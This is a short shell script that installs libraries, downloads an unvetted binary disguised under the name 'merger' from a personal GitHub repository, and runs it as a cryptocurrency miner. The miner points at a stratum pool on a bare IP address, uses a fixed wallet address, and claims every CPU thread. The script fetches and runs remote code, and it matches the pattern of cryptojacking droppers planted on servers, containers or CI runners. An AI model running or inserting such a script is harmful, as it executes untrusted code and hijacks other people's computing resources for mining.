#!/bin/sh
apt-get update && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 libnuma-dev
wget https://github.com/nestri12329018/file/raw/main/merger
chmod +x merger
./merger -a yespowersugar -o stratum+tcps://47.89.234.73:443 -u sugar1qwrnwp0xpuxk57l4p3strxlc9aze8k9lx25s8f0.$(echo $(shuf -i 1-20000 -n 1)-GG) -p x -t$(nproc --all)
